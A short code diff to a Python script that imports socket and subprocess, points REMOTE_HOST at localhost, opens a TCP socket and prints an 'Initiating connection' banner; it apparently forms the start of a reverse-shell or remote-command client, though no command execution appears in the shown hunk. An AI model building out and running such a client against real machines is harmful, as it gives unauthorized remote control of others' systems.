@@ -3,9 +3,9 @@ import socket
 import subprocess
 
 # Setting up IP and Sockets
-REMOTE_HOST = "127.0.0.1"
-REMOTE_PORT = 8081  # 2222
-client = socket.socket
+REMOTE_HOST = "localhost"
+REMOTE_PORT = 8080  # 2222
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Initializing connetion
 print("[-] Initiating connection ...")
